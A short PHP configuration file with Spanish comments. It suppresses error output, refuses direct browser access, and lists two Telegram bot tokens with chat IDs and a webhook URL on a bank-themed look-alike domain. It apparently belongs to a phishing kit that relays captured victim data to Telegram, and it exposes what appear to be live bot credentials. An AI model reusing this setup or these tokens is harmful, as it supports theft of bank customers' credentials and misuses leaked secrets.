<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Bots y grupos
$telegram_accounts = [

    [
        'token' => '8333175930:AAH8zK1h6bjK-A5TiKd63C5EFAhGlD_WZO0',
        'chat_id' => '-5228173748'
    ],

    [
        'token' => '8230345120:AAEvBhKizuAYGZxs2wwKX7tf9ubFr6S1ueA',
        'chat_id' => '8715543743'
    ]

];

$webhook_url = 'https://mercantil100anos.onrender.com/approve.php';
?>
